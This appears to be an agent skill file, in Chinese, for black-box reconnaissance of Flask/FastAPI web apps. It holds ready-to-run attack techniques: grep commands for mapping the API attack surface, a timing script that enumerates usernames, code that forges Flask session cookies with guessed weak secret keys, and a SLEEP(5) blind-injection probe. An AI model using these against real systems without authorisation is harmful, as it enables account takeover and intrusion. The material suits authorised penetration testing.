---
name: python-webapp-recon
description: "Recon Flask/FastAPI + JS web apps: API surface, timing enum."
---

# Python WebApp 黑盒侦察（JS 前端 + Flask/FastAPI/Werkzeug 后端）

## 触发条件
目标为登录保护的后台 Web 应用，前端是 JS SPA（有 app.js/index.html），后端是 Python（响应头 `Server: Werkzeug/...` 或 `/openapi.json` 等）。需要快速摸清 API 攻击面、认证架构、可枚举的用户名。

## 核心原则
登录后台的价值集中在 **前端 JS 文件（app.js/index.html）**，而非目录爆破。先把它们抓下来 grep，能拿到 90% 的 API 攻击面。

## 1. 从前端 JS 提取完整 API 攻击面

```bash
curl -s http://TARGET/ -o index.html
grep -oE '(src|href)="[^"]*"' index.html | sort -u      # 找 /app.js /style.css
curl -s http://TARGET/app.js -o app.js

# 静态端点（字符串字面量）
grep -oE "api\(['\"][^'\"]*['\"][^)]*\)" app.js | grep -oE "'/api/[^']*'" | sort -u

# 动态端点（模板字符串）—— 关键，别漏
grep -oE 'api\(`/api/[^`]*\$\{[^`]*`' app.js
grep -oE 'fetch\(`/api/[^`]*' app.js

# 第三方服务/回调域名
grep -oE 'https?://[^"'"'"' )]+' app.js index.html | sort -u
```

**坑**：`/api/products/{id}/inventory`（文件上传）、`/api/users/{uid}/balance`（改余额）这类动态拼接端点只在模板字符串里出现，仅 `grep '/api/'` 会漏掉。前端函数名（`loadOrders`/`loadUsers`）与端点不一一对应时，去 grep 这些函数体的 `api(\`/api/...\`)`。

## 2. 指纹识别
- `Server: Werkzeug/X.Y.Z Python/A.B.C` = Flask 开发服务器
- `Content-Disposition: inline; filename=index.html` + `ETag`/`Last-Modified` = `send_file` 静态服务签名
- 高端口(5000/8000)直连 + 80/443 走反向代理(Caddy/Nginx) = 后端绕过反代直接暴露
- `Vary: Cookie` = Flask session（签名 cookie）认证

## 3. 认证架构探测
- `/api/check_auth` 返回 `{"authenticated":false}` + HTTP 401（软认证）vs 业务端点返回 `{"error":"请先登录"}` 401（硬认证）
- 404 被全局 handler 包装成 500 并返回 JSON（非 HTML debug traceback）= debug=False，Werkzeug debugger 不可用

## 4. 时间侧信道枚举用户名（慢哈希）
登录接口参数化但密码走慢哈希时，响应时间能区分用户名存在性：

| 场景 | 响应时间 |
|---|---|
| 用户名存在（查记录 + 计算 bcrypt/pbkdf2） | ~440ms |
| 用户名不存在（查询空，无哈希计算） | ~100ms |

```python
import json, urllib.request, time, statistics
def t(u):
    d = json.dumps({"username": u, "password": "x"}).encode()
    r = urllib.request.Request(URL, data=d, headers={"Content-Type": "application/json"}, method="POST")
    t0 = time.time()
    try: urllib.request.urlopen(r, timeout=10)
    except urllib.error.HTTPError: pass
    return time.time() - t0
# 对每个候选用户名测 5 次取中位数，显著慢的那个就是有效用户名
```

## 5. JSON 注入误报陷阱（重要）
手工拼 JSON body 时，双引号会破坏 JSON 结构：
- `{"username":"admin" OR "1"="1"}` = 非法 JSON → `request.json` 为 None → 后端报 `'NoneType' object has no attribute 'get'`
- 这个 500 是 **JSON 解析错误**，不是 SQL 注入
- 必须用 `json.dumps(...)` 正确转义后重测；单引号 payload 在 JSON 里合法，双引号需转义

## 6. Flask session 伪造
```python
from itsdangerous import URLSafeTimedSerializer
import hashlib
s = URLSafeTimedSerializer(secret_key, salt="cookie-session",
    signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1})
cookie = s.dumps({"logged_in": True})
# 常见弱 key: secret/dev/flask/admin/应用名/域名前缀
# 常见结构: {'logged_in':True} {'user_id':1} {'username':'admin'} {'authenticated':True}
# 验证: 带 Cookie: session=<cookie> 请求 /api/check_auth，200 + authenticated:true 即成功
```
注意 hermes 的 python3 可能是 venv（无 pip/itsdangerous），系统 pip 装到 python3.8 → 用 `/usr/bin/python3.8` 跑伪造脚本。

## 7. 支付回调 stub 检测
notify/webhook 端点对任意输入（错误 secret、不存在订单号、null、数组、非法 JSON）都返回固定 `{"status":"success"}`(POST)/`OK`(GET) = 无签名/secret 校验的 stub。再用时间盲注对 order_no 参数打 `SLEEP(5)` 确认其完全惰性（无 DB 查询），区分「未实现」与「吞错误的真实处理」。

## 8. 扫描器速率控制
nuclei/ffuf >5-10 req/s 会压垮单线程 Werkzeug 开发服务器 → `Connection reset by peer`。目标为 Werkzeug 时用 `-rl 5` 并串行化请求；扫描后确认服务器仍响应。

## Pitfalls 汇总
- 双引号 JSON 报 `NoneType.get` = 解析错误，别当 SQLi 报
- 只 grep 字面量端点会漏动态模板端点
- Werkzeug 开发服务器被并发扫描压垮是正常现象，降低速率即可
- 未认证端点统一 401「请先登录」不代表没有未认证回调（notify/return 往往例外）
